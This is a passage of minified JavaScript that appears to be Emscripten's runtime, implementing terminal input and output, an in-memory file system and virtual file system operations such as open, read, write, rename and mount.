Buffer(256),n=0;try{n=nodeFS.readSync(process.stdin.fd,r,0,256,null)}catch(e){if(-1==e.toString().indexOf("EOF"))throw e;n=0}t=0<n?r.slice(0,n).toString("utf-8"):null}else"undefined"!=typeof window&&"function"==typeof window.prompt?null!==(t=window.prompt("Input: "))&&(t+="\\n"):"function"==typeof readline&&null!==(t=readline())&&(t+="\\n");if(!t)return null;e.input=intArrayFromString(t,!0)}return e.input.shift()},put_char:function(e,t){null===t||10===t?(out(UTF8ArrayToString(e.output,0)),e.output=[]):0!=t&&e.output.push(t)},flush:function(e){e.output&&0<e.output.length&&(out(UTF8ArrayToString(e.output,0)),e.output=[])}},default_tty1_ops:{put_char:function(e,t){null===t||10===t?(err(UTF8ArrayToString(e.output,0)),e.output=[]):0!=t&&e.output.push(t)},flush:function(e){e.output&&0<e.output.length&&(err(UTF8ArrayToString(e.output,0)),e.output=[])}}},MEMFS={ops_table:null,mount:function(e){return MEMFS.createNode(null,"/",16895,0)},createNode:function(e,t,r,n){if(FS.isBlkdev(r)||FS.isFIFO(r))throw new FS.ErrnoError(63);MEMFS.ops_table||(MEMFS.ops_table={dir:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,lookup:MEMFS.node_ops.lookup,mknod:MEMFS.node_ops.mknod,rename:MEMFS.node_ops.rename,unlink:MEMFS.node_ops.unlink,rmdir:MEMFS.node_ops.rmdir,readdir:MEMFS.node_ops.readdir,symlink:MEMFS.node_ops.symlink},stream:{llseek:MEMFS.stream_ops.llseek}},file:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:{llseek:MEMFS.stream_ops.llseek,read:MEMFS.stream_ops.read,write:MEMFS.stream_ops.write,allocate:MEMFS.stream_ops.allocate,mmap:MEMFS.stream_ops.mmap,msync:MEMFS.stream_ops.msync}},link:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,readlink:MEMFS.node_ops.readlink},stream:{}},chrdev:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:FS.chrdev_stream_ops}});var o=FS.createNode(e,t,r,n);return FS.isDir(o.mode)?(o.node_ops=MEMFS.ops_table.dir.node,o.stream_ops=MEMFS.ops_table.dir.stream,o.contents={}):FS.isFile(o.mode)?(o.node_ops=MEMFS.ops_table.file.node,o.stream_ops=MEMFS.ops_table.file.stream,o.usedBytes=0,o.contents=null):FS.isLink(o.mode)?(o.node_ops=MEMFS.ops_table.link.node,o.stream_ops=MEMFS.ops_table.link.stream):FS.isChrdev(o.mode)&&(o.node_ops=MEMFS.ops_table.chrdev.node,o.stream_ops=MEMFS.ops_table.chrdev.stream),o.timestamp=Date.now(),e&&(e.contents[t]=o),o},getFileDataAsRegularArray:function(e){if(e.contents&&e.contents.subarray){for(var t=[],r=0;r<e.usedBytes;++r)t.push(e.contents[r]);return t}return e.contents},getFileDataAsTypedArray:function(e){return e.contents?e.contents.subarray?e.contents.subarray(0,e.usedBytes):new Uint8Array(e.contents):new Uint8Array},expandFileStorage:function(e,t){var r,n=e.contents?e.contents.length:0;t<=n||(t=Math.max(t,n*(n<1048576?2:1.125)|0),0!=n&&(t=Math.max(t,256)),r=e.contents,e.contents=new Uint8Array(t),0<e.usedBytes&&e.contents.set(r.subarray(0,e.usedBytes),0))},resizeFileStorage:function(e,t){if(e.usedBytes!=t){if(0==t)return e.contents=null,void(e.usedBytes=0);if(!e.contents||e.contents.subarray){var r=e.contents;return e.contents=new Uint8Array(new ArrayBuffer(t)),r&&e.contents.set(r.subarray(0,Math.min(t,e.usedBytes))),void(e.usedBytes=t)}if(e.contents||(e.contents=[]),e.contents.length>t)e.contents.length=t;else for(;e.contents.length<t;)e.contents.push(0);e.usedBytes=t}},node_ops:{getattr:function(e){var t={};return t.dev=FS.isChrdev(e.mode)?e.id:1,t.ino=e.id,t.mode=e.mode,t.nlink=1,t.uid=0,t.gid=0,t.rdev=e.rdev,FS.isDir(e.mode)?t.size=4096:FS.isFile(e.mode)?t.size=e.usedBytes:FS.isLink(e.mode)?t.size=e.link.length:t.size=0,t.atime=new Date(e.timestamp),t.mtime=new Date(e.timestamp),t.ctime=new Date(e.timestamp),t.blksize=4096,t.blocks=Math.ceil(t.size/t.blksize),t},setattr:function(e,t){void 0!==t.mode&&(e.mode=t.mode),void 0!==t.timestamp&&(e.timestamp=t.timestamp),void 0!==t.size&&MEMFS.resizeFileStorage(e,t.size)},lookup:function(e,t){throw FS.genericErrors[44]},mknod:function(e,t,r,n){return MEMFS.createNode(e,t,r,n)},rename:function(e,t,r){if(FS.isDir(e.mode)){var n;try{n=FS.lookupNode(t,r)}catch(e){}if(n)for(var o in n.contents)throw new FS.ErrnoError(55)}delete e.parent.contents[e.name],e.name=r,(t.contents[r]=e).parent=t},unlink:function(e,t){delete e.contents[t]},rmdir:function(e,t){var r,n=FS.lookupNode(e,t);for(r in n.contents)throw new FS.ErrnoError(55);delete e.contents[t]},readdir:function(e){var t,r=[".",".."];for(t in e.contents)e.contents.hasOwnProperty(t)&&r.push(t);return r},symlink:function(e,t,r){var n=MEMFS.createNode(e,t,41471,0);return n.link=r,n},readlink:function(e){if(!FS.isLink(e.mode))throw new FS.ErrnoError(28);return e.link}},stream_ops:{read:function(e,t,r,n,o){var i=e.node.contents;if(o>=e.node.usedBytes)return 0;var a=Math.min(e.node.usedBytes-o,n);if(8<a&&i.subarray)t.set(i.subarray(o,o+a),r);else for(var s=0;s<a;s++)t[r+s]=i[o+s];return a},write:function(e,t,r,n,o,i){if(!n)return 0;var a=e.node;if(a.timestamp=Date.now(),t.subarray&&(!a.contents||a.contents.subarray)){if(i)return a.contents=t.subarray(r,r+n),a.usedBytes=n;if(0===a.usedBytes&&0===o)return a.contents=new Uint8Array(t.subarray(r,r+n)),a.usedBytes=n;if(o+n<=a.usedBytes)return a.contents.set(t.subarray(r,r+n),o),n}if(MEMFS.expandFileStorage(a,o+n),a.contents.subarray&&t.subarray)a.contents.set(t.subarray(r,r+n),o);else for(var s=0;s<n;s++)a.contents[o+s]=t[r+s];return a.usedBytes=Math.max(a.usedBytes,o+n),n},llseek:function(e,t,r){var n=t;if(1===r?n+=e.position:2===r&&FS.isFile(e.node.mode)&&(n+=e.node.usedBytes),n<0)throw new FS.ErrnoError(28);return n},allocate:function(e,t,r){MEMFS.expandFileStorage(e.node,t+r),e.node.usedBytes=Math.max(e.node.usedBytes,t+r)},mmap:function(e,t,r,n,o,i,a){if(!FS.isFile(e.node.mode))throw new FS.ErrnoError(43);var s,u=e.node.contents;if(2&a||u.buffer!==t.buffer){(0<o||o+n<e.node.usedBytes)&&(u=u.subarray?u.subarray(o,o+n):Array.prototype.slice.call(u,o,o+n)),s=!0;var l,c=t.buffer==HEAP8.buffer;if(!(l=_malloc(n)))throw new FS.ErrnoError(48);(c?HEAP8:t).set(u,l)}else s=!1,l=u.byteOffset;return{ptr:l,allocated:s}},msync:function(e,t,r,n,o){if(!FS.isFile(e.node.mode))throw new FS.ErrnoError(43);if(2&o)return 0;MEMFS.stream_ops.write(e,t,0,n,r,!1);return 0}}},FS={root:null,mounts:[],devices:{},streams:[],nextInode:1,nameTable:null,currentPath:"/",initialized:!1,ignorePermissions:!0,trackingDelegate:{},tracking:{openFlags:{READ:1,WRITE:2}},ErrnoError:null,genericErrors:{},filesystems:null,syncFSRequests:0,handleFSError:function(e){if(!(e instanceof FS.ErrnoError))throw e+" : "+stackTrace();return ___setErrNo(e.errno)},lookupPath:function(e,t){if(t=t||{},!(e=PATH_FS.resolve(FS.cwd(),e)))return{path:"",node:null};var r,n={follow_mount:!0,recurse_count:0};for(r in n)void 0===t[r]&&(t[r]=n[r]);if(8<t.recurse_count)throw new FS.ErrnoError(32);for(var o=PATH.normalizeArray(e.split("/").filter(function(e){return!!e}),!1),i=FS.root,a="/",s=0;s<o.length;s++){var u=s===o.length-1;if(u&&t.parent)break;if(i=FS.lookupNode(i,o[s]),a=PATH.join2(a,o[s]),FS.isMountpoint(i)&&(!u||u&&t.follow_mount)&&(i=i.mounted.root),!u||t.follow)for(var l=0;FS.isLink(i.mode);){var c=FS.readlink(a),a=PATH_FS.resolve(PATH.dirname(a),c),i=FS.lookupPath(a,{recurse_count:t.recurse_count}).node;if(40<l++)throw new FS.ErrnoError(32)}}return{path:a,node:i}},getPath:function(e){for(var t;;){if(FS.isRoot(e)){var r=e.mount.mountpoint;return t?"/"!==r[r.length-1]?r+"/"+t:r+t:r}t=t?e.name+"/"+t:e.name,e=e.parent}},hashName:function(e,t){for(var r=0,n=0;n<t.length;n++)r=(r<<5)-r+t.charCodeAt(n)|0;return(e+r>>>0)%FS.nameTable.length},hashAddNode:function(e){var t=FS.hashName(e.parent.id,e.name);e.name_next=FS.nameTable[t],FS.nameTable[t]=e},hashRemoveNode:function(e){var t=FS.hashName(e.parent.id,e.name);if(FS.nameTable[t]===e)FS.nameTable[t]=e.name_next;else for(var r=FS.nameTable[t];r;){if(r.name_next===e){r.name_next=e.name_next;break}r=r.name_next}},lookupNode:function(e,t){var r=FS.mayLookup(e);if(r)throw new FS.ErrnoError(r,e);for(var n=FS.hashName(e.id,t),o=FS.nameTable[n];o;o=o.name_next){var i=o.name;if(o.parent.id===e.id&&i===t)return o}return FS.lookup(e,t)},createNode:function(e,t,r,n){FS.FSNode||(FS.FSNode=function(e,t,r,n){e=e||this,this.parent=e,this.mount=e.mount,this.mounted=null,this.id=FS.nextInode++,this.name=t,this.mode=r,this.node_ops={},this.stream_ops={},this.rdev=n},FS.FSNode.prototype={},Object.defineProperties(FS.FSNode.prototype,{read:{get:function(){return 365==(365&this.mode)},set:function(e){e?this.mode|=365:this.mode&=-366}},write:{get:function(){return 146==(146&this.mode)},set:function(e){e?this.mode|=146:this.mode&=-147}},isFolder:{get:function(){return FS.isDir(this.mode)}},isDevice:{get:function(){return FS.isChrdev(this.mode)}}}));var o=new FS.FSNode(e,t,r,n);return FS.hashAddNode(o),o},destroyNode:function(e){FS.hashRemoveNode(e)},isRoot:function(e){return e===e.parent},isMountpoint:function(e){return!!e.mounted},isFile:function(e){return 32768==(61440&e)},isDir:function(e){return 16384==(61440&e)},isLink:function(e){return 40960==(61440&e)},isChrdev:function(e){return 8192==(61440&e)},isBlkdev:function(e){return 24576==(61440&e)},isFIFO:function(e){return 4096==(61440&e)},isSocket:function(e){return 49152==(49152&e)},flagModes:{r:0,rs:1052672,"r+":2,w:577,wx:705,xw:705,"w+":578,"wx+":706,"xw+":706,a:1089,ax:1217,xa:1217,"a+":1090,"ax+":1218,"xa+":1218},modeStringToFlags:function(e){var t=FS.flagModes[e];if(void 0===t)throw new Error("Unknown file open mode: "+e);return t},flagsToPermissionString:function(e){var t=["r","w","rw"][3&e];return 512&e&&(t+="w"),t},nodePermissions:function(e,t){return FS.ignorePermissions||(-1===t.indexOf("r")||292&e.mode)&&(-1===t.indexOf("w")||146&e.mode)&&(-1===t.indexOf("x")||73&e.mode)?0:2},mayLookup:function(e){var t=FS.nodePermissions(e,"x");return t||(e.node_ops.lookup?0:2)},mayCreate:function(e,t){try{FS.lookupNode(e,t);return 20}catch(e){}return FS.nodePermissions(e,"wx")},mayDelete:function(e,t,r){var n;try{n=FS.lookupNode(e,t)}catch(e){return e.errno}var o=FS.nodePermissions(e,"wx");if(o)return o;if(r){if(!FS.isDir(n.mode))return 54;if(FS.isRoot(n)||FS.getPath(n)===FS.cwd())return 10}else if(FS.isDir(n.mode))return 31;return 0},mayOpen:function(e,t){return e?FS.isLink(e.mode)?32:FS.isDir(e.mode)&&("r"!==FS.flagsToPermissionString(t)||512&t)?31:FS.nodePermissions(e,FS.flagsToPermissionString(t)):44},MAX_OPEN_FDS:4096,nextfd:function(e,t){e=e||0,t=t||FS.MAX_OPEN_FDS;for(var r=e;r<=t;r++)if(!FS.streams[r])return r;throw new FS.ErrnoError(33)},getStream:function(e){return FS.streams[e]},createStream:function(e,t,r){FS.FSStream||(FS.FSStream=function(){},FS.FSStream.prototype={},Object.defineProperties(FS.FSStream.prototype,{object:{get:function(){return this.node},set:function(e){this.node=e}},isRead:{get:function(){return 1!=(2097155&this.flags)}},isWrite:{get:function(){return 0!=(2097155&this.flags)}},isAppend:{get:function(){return 1024&this.flags}}}));var n,o=new FS.FSStream;for(n in e)o[n]=e[n];e=o;var i=FS.nextfd(t,r);return e.fd=i,FS.streams[i]=e},closeStream:function(e){FS.streams[e]=null},chrdev_stream_ops:{open:function(e){var t=FS.getDevice(e.node.rdev);e.stream_ops=t.stream_ops,e.stream_ops.open&&e.stream_ops.open(e)},llseek:function(){throw new FS.ErrnoError(70)}},major:function(e){return e>>8},minor:function(e){return 255&e},makedev:function(e,t){return e<<8|t},registerDevice:function(e,t){FS.devices[e]={stream_ops:t}},getDevice:function(e){return FS.devices[e]},getMounts:function(e){for(var t=[],r=[e];r.length;){var n=r.pop();t.push(n),r.push.apply(r,n.mounts)}return t},syncfs:function(t,r){"function"==typeof t&&(r=t,t=!1),FS.syncFSRequests++,1<FS.syncFSRequests&&console.log("warning: "+FS.syncFSRequests+" FS.syncfs operations in flight at once, probably just doing extra work");var n=FS.getMounts(FS.root.mount),o=0;function i(e){return FS.syncFSRequests--,r(e)}function a(e){if(e)return a.errored?void 0:(a.errored=!0,i(e));++o>=n.length&&i(null)}n.forEach(function(e){return e.type.syncfs?void e.type.syncfs(e,t,a):a(null)})},mount:function(e,t,r){var n,o="/"===r,i=!r;if(o&&FS.root)throw new FS.ErrnoError(10);if(!o&&!i){var a=FS.lookupPath(r,{follow_mount:!1});if(r=a.path,n=a.node,FS.isMountpoint(n))throw new FS.ErrnoError(10);if(!FS.isDir(n.mode))throw new FS.ErrnoError(54)}var s={type:e,opts:t,mountpoint:r,mounts:[]},u=e.mount(s);return(u.mount=s).root=u,o?FS.root=u:n&&(n.mounted=s,n.mount&&n.mount.mounts.push(s)),u},unmount:function(e){var t=FS.lookupPath(e,{follow_mount:!1});if(!FS.isMountpoint(t.node))throw new FS.ErrnoError(28);var r=t.node,n=r.mounted,o=FS.getMounts(n);Object.keys(FS.nameTable).forEach(function(e){for(var t=FS.nameTable[e];t;){var r=t.name_next;-1!==o.indexOf(t.mount)&&FS.destroyNode(t),t=r}}),r.mounted=null;var i=r.mount.mounts.indexOf(n);r.mount.mounts.splice(i,1)},lookup:function(e,t){return e.node_ops.lookup(e,t)},mknod:function(e,t,r){var n=FS.lookupPath(e,{parent:!0}).node,o=PATH.basename(e);if(!o||"."===o||".."===o)throw new FS.ErrnoError(28);var i=FS.mayCreate(n,o);if(i)throw new FS.ErrnoError(i);if(!n.node_ops.mknod)throw new FS.ErrnoError(63);return n.node_ops.mknod(n,o,t,r)},create:function(e,t){return t=void 0!==t?t:438,t&=4095,t|=32768,FS.mknod(e,t,0)},mkdir:function(e,t){return t=void 0!==t?t:511,t&=1023,t|=16384,FS.mknod(e,t,0)},mkdirTree:function(e,t){for(var r=e.split("/"),n="",o=0;o<r.length;++o)if(r[o]){n+="/"+r[o];try{FS.mkdir(n,t)}catch(e){if(20!=e.errno)throw e}}},mkdev:function(e,t,r){return void 0===r&&(r=t,t=438),t|=8192,FS.mknod(e,t,r)},symlink:function(e,t){if(!PATH_FS.resolve(e))throw new FS.ErrnoError(44);var r=FS.lookupPath(t,{parent:!0}).node;if(!r)throw new FS.ErrnoError(44);var n=PATH.basename(t),o=FS.mayCreate(r,n);if(o)throw new FS.ErrnoError(o);if(!r.node_ops.symlink)throw new FS.ErrnoError(63);return r.node_ops.symlink(r,n,e)},rename:function(t,r){var e,n,o=PATH.dirname(t),i=PATH.dirname(r),a=PATH.basename(t),s=PATH.basename(r);try{e=FS.lookupPath(t,{parent:!0}).node,n=FS.lookupPath(r,{parent:!0}).node}catch(e){throw new FS.ErrnoError(10)}if(!e||!n)throw new FS.ErrnoError(44);if(e.mount!==n.mount)throw new FS.ErrnoError(75);var u,l=FS.lookupNode(e,a),c=PATH_FS.relative(t,i);if("."!==c.charAt(0))throw new FS.ErrnoError(28);if("."!==(c=PATH_FS.relative(r,o)).charAt(0))throw new FS.ErrnoError(55);try{u=FS.lookupNode(n,s)}catch(e){}if(l!==u){var d=FS.isDir(l.mode),f=FS.mayDelete(e,a,d);if(f)throw new FS.ErrnoError(f);if(f=u?FS.mayDelete(n,s,d):FS.mayCreate(n,s))throw new FS.ErrnoError(f);if(!e.node_ops.rename)throw new FS.ErrnoError(63);if(FS.isMountpoint(l)||u&&FS.isMountpoint(u))throw new FS.ErrnoError(10);if(n!==e&&(f=FS.nodePermissions(e,"w")))throw new FS.ErrnoError(f);try{FS.trackingDelegate.willMovePath&&FS.trackingDelegate.willMovePath(t,r)}catch(e){console.log("FS.trackingDelegate[\'willMovePath\'](\'"+t+"\', \'"+r+"\') threw an exception: "+e.message)}FS.hashRemoveNode(l);try{e.node_ops.rename(l,n,s)}catch(e){throw e}finally{FS.hashAddNode(l)}try{FS.trackingDelegate.onMovePath&&FS.trackingDelegate.onMovePath(t,r)}catch(e){console.log("FS.trackingDelegate[\'onMovePath\'](\'"+t+"\', \'"+r+"\') threw an exception: "+e.message)}}},rmdir:function(t){var e=FS.lookupPath(t,{parent:!0}).node,r=PATH.basename(t),n=FS.lookupNode(e,r),o=FS.mayDelete(e,r,!0);if(o)throw new FS.ErrnoError(o);if(!e.node_ops.rmdir)throw new FS.ErrnoError(63);if(FS.isMountpoint(n))throw new FS.ErrnoError(10);try{FS.trackingDelegate.willDeletePath&&FS.trackingDelegate.willDeletePath(t)}catch(e){console.log("FS.trackingDelegate[\'willDeletePath\'](\'"+t+"\') threw an exception: "+e.message)}e.node_ops.rmdir(e,r),FS.destroyNode(n);try{FS.trackingDelegate.onDeletePath&&FS.trackingDelegate.onDeletePath(t)}catch(e){console.log("FS.trackingDelegate[\'onDeletePath\'](\'"+t+"\') threw an exception: "+e.message)}},readdir:function(e){var t=FS.lookupPath(e,{follow:!0}).node;if(!t.node_ops.readdir)throw new FS.ErrnoError(54);return t.node_ops.readdir(t)},unlink:function(t){var e=FS.lookupPath(t,{parent:!0}).node,r=PATH.basename(t),n=FS.lookupNode(e,r),o=FS.mayDelete(e,r,!1);if(o)throw new FS.ErrnoError(o);if(!e.node_ops.unlink)throw new FS.ErrnoError(63);if(FS.isMountpoint(n))throw new FS.ErrnoError(10);try{FS.trackingDelegate.willDeletePath&&FS.trackingDelegate.willDeletePath(t)}catch(e){console.log("FS.trackingDelegate[\'willDeletePath\'](\'"+t+"\') threw an exception: "+e.message)}e.node_ops.unlink(e,r),FS.destroyNode(n);try{FS.trackingDelegate.onDeletePath&&FS.trackingDelegate.onDeletePath(t)}catch(e){console.log("FS.trackingDelegate[\'onDeletePath\'](\'"+t+"\') threw an exception: "+e.message)}},readlink:function(e){var t=FS.lookupPath(e).node;if(!t)throw new FS.ErrnoError(44);if(!t.node_ops.readlink)throw new FS.ErrnoError(28);return PATH_FS.resolve(FS.getPath(t.parent),t.node_ops.readlink(t))},stat:function(e,t){var r=FS.lookupPath(e,{follow:!t}).node;if(!r)throw new FS.ErrnoError(44);if(!r.node_ops.getattr)throw new FS.ErrnoError(63);return r.node_ops.getattr(r)},lstat:function(e){return FS.stat(e,!0)},chmod:function(e,t,r){var n;if(!(n="string"==typeof e?FS.lookupPath(e,{follow:!r}).node:e).node_ops.setattr)throw new FS.ErrnoError(63);n.node_ops.setattr(n,{mode:4095&t|-4096&n.mode,timestamp:Date.now()})},lchmod:function(e,t){FS.chmod(e,t,!0)},fchmod:function(e,t){var r=FS.getStream(e);if(!r)throw new FS.ErrnoError(8);FS.chmod(r.node,t)},chown:function(e,t,r,n){var o;if(!(o="string"==typeof e?FS.lookupPath(e,{follow:!n}).node:e).node_ops.setattr)throw new FS.ErrnoError(63);o.node_ops.setattr(o,{timestamp:Date.now()})},lchown:function(e,t,r){FS.chown(e,t,r,!0)},fchown:function(e,t,r){var n=FS.getStream(e);if(!n)throw new FS.ErrnoError(8);FS.chown(n.node,t,r)},truncate:function(e,t){if(t<0)throw new FS.ErrnoError(28);var r;if(!(r="string"==typeof e?FS.lookupPath(e,{follow:!0}).node:e).node_ops.setattr)throw new FS.ErrnoError(63);if(FS.isDir(r.mode))throw new FS.ErrnoError(31);if(!FS.isFile(r.mode))throw new FS.ErrnoError(28);var n=FS.nodePermissions(r,"w");if(n)throw new FS.ErrnoError(n);r.node_ops.setattr(r,{size:t,timestamp:Date.now()})},ftruncate:function(e,t){var r=FS.getStream(e);if(!r)throw new FS.ErrnoError(8);if(0==(2097155&r.flags))throw new FS.ErrnoError(28);FS.truncate(r.node,t)},utime:function(e,t,r){var n=FS.lookupPath(e,{follow:!0}).node;n.node_ops.setattr(n,{timestamp:Math.max(t,r)})},open:function(t,e,r,n,o){if(""===t)throw new FS.ErrnoError(44);if(r=void 0===r?438:r,r=64&(e="string"==typeof e?FS.modeStringToFlags(e):e)?4095&r|32768:0,"object"==typeof t)i=t;else{t=PATH.normalize(t);try{var i=FS.lookupPath(t,{follow:!(131072&e)}).node}catch(e){}}var a=!1;if(64&e)if(i){if(128&e)throw new FS.ErrnoError(20)}else i=FS.mknod(t,r,0),a=!0;if(!i)throw new FS.ErrnoError(44);if(FS.isChrdev(i.mode)&&(e&=-513),65536&e&&!FS.isDir(i.mode))throw new FS.ErrnoError(54);if(!a){var s=FS.mayOpen(i,e);if(s)throw new FS.ErrnoError(s)}512&e&&FS.truncate(i,0),e&=-641;var u,l=FS.createStream({node:i,path:FS.getPath(i),flags:e,seekable:!0,position:0,stream_ops:i.stream_ops,ungotten:[],error:!1},n,o);l.stream_ops.open&&l.stream_ops.open(l),!Module.logReadFiles||1&e||(FS.readFiles||(FS.readFiles={}),t in FS.readFiles||(FS.readFiles[t]=1,console.log("FS.trackingDelegate error on read file: "+t)));try{FS.trackingDelegate.onOpenFile&&(u=0,1!=(2097155&e)&&(u|=FS.tracking.openFlags.READ),0!=(2097155&e)&&(u|=FS.tracking.openFlags.WRITE),FS.trackingDelegate.onOpenFile(t,u))}catch(e){console.log("FS.trackingDelegate[\'onOpenFile\'](\'"+t+"\', flags) threw an exception: "+e.message)}return l},close:function(e){if(FS.isClosed(e))throw new FS.ErrnoError(8);e.getdents&&(e.getdents=null);try{e.stream_ops.close&&e.stream_ops.close(e)}catch(e){throw e}finally{FS.closeStream(e.fd)}e.fd=null},isClosed:function(e){return null===e.fd},llseek:function(e,t,r){if(FS.isClosed(e))throw new FS.ErrnoError(8);if(!e.seekable||!e.stream_ops.llseek)throw new FS.ErrnoError(70);if(0!=r&&1!=r&&2!=r)throw new FS.ErrnoError(28);return e.position=e.stream_ops.llseek(e,t,r),e.ungotten=[],e.position},read:function(e,t,r,n,o){if(n<0||o<0)throw new FS.ErrnoError(28);if(FS.isClosed(e))throw new FS.ErrnoError(8);if(1==(2097155&e.flags))throw new FS.ErrnoError(8);if(FS.isDir(e.node.mode))throw new FS.ErrnoError(31);if(!e.stream_ops.read)throw new FS.ErrnoError(28);var i=void 0!==o;if(i){if(!e.seekable)throw new FS.ErrnoError(70)}else o=e.position;var a=e.stream_ops.read(e,t,r,n,o);return i||(e.position+=a),a},write:function(t,e,r,n,o,i){if(n<0||o<0)throw new FS.ErrnoError(28);if(FS.isClosed(t))throw new FS.ErrnoError(8);if(0==(2097155&t.flags))throw new FS.ErrnoError(8);if(FS.isDir(t.node.mode))throw new FS.ErrnoError(31);if(!t.stream_ops.write)throw new FS.ErrnoError(28);1024&t.flags&&FS.llseek(t,0,2);var a=void 0!==o;if(a){if(!t.seekable)throw new FS.ErrnoError(70)}else o=t.position;var s=t.stream_ops.write(t,e,r,n,o,i);a||(t.position+=s);try{t.path&&FS.trackingDelegate.onWriteToFile&&FS.trackingDelegate.onWriteToFile(t.path)}catch(e){console.log("FS.trackingDelegate[\'onWriteToFile\'](\'"+t.path+"\') threw an exception: "+e.message)}return s},allocate:function(e,t,r){if(FS.isClosed(e))throw new FS.ErrnoError(8);if(t<0||r<=0)throw new FS.ErrnoError(28);if(0==(2097155&e.flags))throw new FS.ErrnoError(8);if(!FS.isFile(e.node.mode)&&!FS.isDir(e.node.mode))throw new FS.ErrnoError(43);if(!e.stream_ops.allocate)throw new FS.ErrnoError(138);e.stream_ops.allocate(e,t,r)},mmap:function(e,t,r,n,o,i,a){if(0!=(2&i)&&0==(2&a)&&2!=(2097155&e.flags))throw new FS.ErrnoError(2);if(1==(2097155&e.flags))throw new FS.ErrnoError(2);if(!e.stream_ops.mmap)throw new FS.ErrnoError(43);return e.stream_ops.mmap(e,t,r,n,o,i,a)},msync:function(e,t,r,n,o){return e&&e.stream_ops.msync?e.stream_ops.msync(e,t,r,n,o):0},munmap:function(e){return 0},ioctl:function(e,t,r){if(!e.stream_ops.ioctl)throw new FS.ErrnoError(59);return e.stream_ops.ioctl(e,t,r)},readFile:function(e,t){if((t=t||{}).flags=t.flags||"r",t.encoding=t.encoding||"binary","utf8"!==t.encoding&&"binary"!==t.encoding)throw new Error(\'Invalid encoding type "\'+t.encoding+\'"\');var r,n=FS.open(e,t.flags),o=FS.stat(e).size,i=new Uint8Array(o);return FS.read(n,i,0,o,0),"utf8"===t.encoding?r=UTF8ArrayToString(i,0):"binary"===t.encoding&&(r=i),FS.close(n),r},writeFile:function(e,t,r){(r=r||{}).flags=r.flags||"w";var n=FS.open(e,r.flags,r.mode);if("string"==typeof t){var o=new Uint8Array(lengthBytesUTF8(t)+1),i=stringToUTF8Array(t,o,0,o.length);FS.write(n,o,0,i,void 0,r.canOwn)}else{if(!ArrayBuffer.isView(t))throw new Error("Unsupported data type");FS.write(n,t,0,t.byteLength,void 0,r.canOwn)}FS.close(n)},cwd:function(){return FS.currentPath},chdir:function(e){var t=FS.lookupPath(e,{follow:!0});if(null===t.node)throw new FS.ErrnoError(44);if(!FS.isDir(t.node.mode))throw new FS.ErrnoError(54);var r=FS.nodePermissions(t.node,"x");if(r)throw new FS.ErrnoError(r);FS.currentPath=t.path},createDefaultDirectories:function(){FS.mkdir("/tmp"),FS.mkdir("/home"),FS.mkdir("/home/web_user")},createDefaultDevices:function(){if(FS.mkdir("/dev"),FS.registerDevice(FS.makedev(1,3),{read:function(){return 0},write:function(e,t,r,n,o){return n}}),FS.mkdev("/dev/null",FS.makedev(1,3)),TTY.register(FS.makedev(5,0),TTY.default_tty_ops),TTY.register(FS.makedev(6,0),TTY.default_tty1_ops),FS.mkdev("/dev/tty",FS.makedev(5,0)),FS.mkdev("/dev/tty1",FS.makedev(6,0)),"object"==typeof crypto&&"function"==typeof crypto.getRandomValues)var e=new Uint8Array(1),t=function(){return crypto.getRandomValues(e),e[0]};else if(ENVIRONMENT_IS_NODE)try{var r=require("crypto");t=function(){return r.randomBytes(1)[0]}}catch(e){}t=t||function(){abort("random_device")},FS.createDevice("/dev","random",t),FS.createDevice("/dev","urandom",t),FS.mkdir("/dev/shm"),FS.mkdir("/dev/shm/tmp")},createSpecialDirectories:function(){FS.mkdir("/proc"),FS.mkdir("/proc/self"),FS.mkdir("/proc/self/fd"),FS.mount({mount:function(){var e=FS.createNode("/proc/self","fd",16895,73);return e.node_ops={lookup:function(e,t){var r=+t,n=FS.getStream(r);if(!n)throw new FS.ErrnoError(8);var o={parent:null,mount:{mountpoint:"fake"},node_ops:{readlink:function(){return n.path}}};return o.parent=o}},e}},{},"/proc/self/fd")},createStandardStreams:function(){Module.stdin?FS.createDevice("/dev","stdin",Module.stdin):FS.symlink("/dev/tty","/dev/stdin"),Module.stdout?FS.createDevice("/dev","stdout",null,Module.stdout):FS.symlink("/dev/tty","/dev/stdout"),Module.stderr?FS.createDevice("/dev","stderr",null,Module.stderr):FS.symlink("/dev/tty1","/dev/stderr");FS.open("/dev/stdin","r"),FS.open("/dev/stdout","w"),FS.open("/dev/stderr","w")},ensureErrnoError:function(){FS.ErrnoError||(FS.ErrnoError=function(e,t){this.node=t,this.setErrno=function(e){this.errno=e},this.setErrno(e),this.message="FS error"},FS.ErrnoError.prototype=new Error,FS.ErrnoError.prototype.constructor=FS.ErrnoError,[44].forEach(function(e){FS.genericErrors[e]=new FS.ErrnoError(e),FS.genericErrors[e].stack="<generic error, no stack>"}))},staticInit:function(){FS.ensureErrnoError(),FS.nameTable=new Array(4096),FS.mount(MEMFS,{},"/"),FS.createDefaultDirectories(),FS.createDefaultDevices(),FS.createSpecialDirectories(),FS.filesystems={MEMFS:MEMFS}},init:function(e,t,r){FS.init.initialized=!0,FS.ensureErrnoError(),Module.stdin=e||Module.stdin,Module.stdout=t||Module.stdout,Module.stderr=r||Module.stderr,FS.createStandardStreams()},quit:function(){FS.init.initialized=!1;var e=Module._fflush;e&&e(0);for(var t=0;t<FS.streams.length;t++){var r=FS.streams[t];r&&FS.close(r)}},getMode:function(e,t){var r=0;return e&&(r|=365),t&&(r|=146),r},joinPath:function(e,t){var r=PATH.join.apply(null,e);return t&&"/"==r[0]&&(r=r.substr(1)),r},absolutePath:function(e,t){return PATH_FS.resolve(t,e)},standardizePath:function(e){return PATH.normalize(e)},findObject:function(e,t){var r=FS.analyzePath(e,t);return r.exists?r.object:(___setErrNo(r.error),null)},analyzePath:function(e,t){try{e=(n=FS.lookupPath(e,{follow:!t})).path}catch(e){}var r={isRoot:!1,exists:!1,error:0,name:null,path:null,object:null,parentExists:!1,parentPath:null,parentObject:null};try{var n=FS.lookupPath(e,{parent:!0});r.parentExists=!0,r.parentPath=n.path,r.parentObject=n.node,r.name=PATH.basename(e),n=FS.lookupPath(e,{follow:!t}),r.exists=!0,r.path=n.path,r.object=n.node,r.name=n.node.name,r.isRoot="/"===n.path}catch(e){r.error=e.errno}return r},createFolder:function(e,t,r,n){var o=PATH.join2("string"==typeof e?e:FS.getPath(e),t),i=FS.getMode(r,n);return 